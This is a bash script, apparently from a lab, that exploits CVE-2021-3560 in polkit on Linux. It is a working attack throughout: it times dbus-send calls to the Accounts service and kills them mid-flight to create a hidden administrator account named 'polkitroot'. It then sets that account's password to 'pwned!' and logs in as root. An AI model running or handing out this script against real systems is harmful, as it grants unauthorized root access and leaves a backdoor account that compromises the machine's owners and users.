#!/bin/bash
# Exploit for CVE-2021-3560

RED="\e[31m"
YELLOW="\e[33m"
BOLDCYAN="\e[1;36m"
GREEN="\e[32m"
ENDCOLOR="\e[0m"

clear
echo -e "${BOLDCYAN}
 _  ______ _______ _______ ______     _             _          
(_)/ _____|_______|_______|_____ \   | |           | |         
 _( (____     _    _______ _____) )  | |      _____| |__   ___ 
| |\____ \   | |  |  ___  |  __  /   | |     (____ |  _ \ /___)
| |_____) )  | |  | |   | | |  \ \   | |_____/ ___ | |_) )___ |
|_(______/   |_|  |_|   |_|_|   |_|  |_______)_____|____/(___/ 
---------------------------------------------------------------
${ENDCOLOR}"
echo "polkit exploit script v1.0"
echo -e "CVE-2021-3560\n-------------"
echo -e "${GREEN}(Remember to \"ssh localhost\")${ENDCOLOR}"

pkVersion=$(pkcheck --version)
echo ${pkVersion}

read -n 1 -s -r -p "Press any key to continue"
echo -e "\nStarting root escalation exploit\n${YELLOW}"

TIMEFORMAT=%R
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:polkitroot string:"iSTAR Polkit Root" int32:1 &> /dev/null
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:polkitroot string:"iSTAR Polkit Root" int32:1 &> /dev/null
(time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:polkitroot string:"iSTAR Polkit Root" int32:1) &> tmp.txt
runtimeEst=$(grep "0" "tmp.txt")
rm tmp.txt
half=$(bc <<< "scale=3; ${runtimeEst} / 2")
echo Setting arg to: 0${half}s
$(id polkitroot &> tmp.txt)
while grep -q "no such" tmp.txt
do
    id polkitroot &> tmp.txt
    $(dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:polkitroot string:"iSTAR Polkit Root" int32:1 & sleep 0${half}s ; kill $!) &> /dev/null
done

$(dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1001 org.freedesktop.Accounts.User.SetPassword string:'$5$0pXioNfTV44eKP.9$F0SMTiqKrrgilRhoS9izuECVmLNL5jLFIFmE/NZcgfD' string:GoldenEye & sleep 0${half}s ; kill $!) &> /dev/null
$(dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1001 org.freedesktop.Accounts.User.SetPassword string:'$5$0pXioNfTV44eKP.9$F0SMTiqKrrgilRhoS9izuECVmLNL5jLFIFmE/NZcgfD' string:GoldenEye & sleep 0${half}s ; kill $!) &> /dev/null
printf 'pwned!' | su - polkitroot &> success.txt

if grep -q "failure" success.txt
then
    ./polkitExploit.sh 0
fi
if [ "$1" != "0" ];
then
    echo -e "${GREEN}\nUser polkitroot is now root\nPass: pwned!${ENDCOLOR}"
    echo -e "\n${BOLDCYAN}Logging into pulkitroot...${ENDCOLOR}"
    su - polkitroot
fi
